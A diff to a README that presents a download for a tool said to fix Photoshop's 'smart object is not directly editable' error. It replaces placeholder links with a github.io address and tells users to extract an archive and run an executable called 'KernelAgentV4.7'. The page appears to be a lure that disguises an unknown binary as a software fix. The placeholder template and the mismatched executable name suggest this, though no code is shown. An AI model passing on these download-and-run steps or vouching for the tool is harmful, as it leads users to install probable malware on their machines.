@@ -2,13 +2,15 @@
 
 This tool solves the error “Could not complete your request because the smart object is not directly editable” by automatically unlocking layers, removing restrictions, and rasterizing non-editable objects using `KernelAgentV4.7`.
 
-[![Download Smart Object Fix](https://img.shields.io/badge/Download-Photoshop_SmartObject_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Smart Object Fix](https://img.shields.io/badge/Download-Photoshop_SmartObject_Fix-blueviolet)](https://photoshop-smart-object-editable-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-smart-object-editable-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopSmartObjectFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will identify non-editable layers and rasterize or unlock them for direct editing  
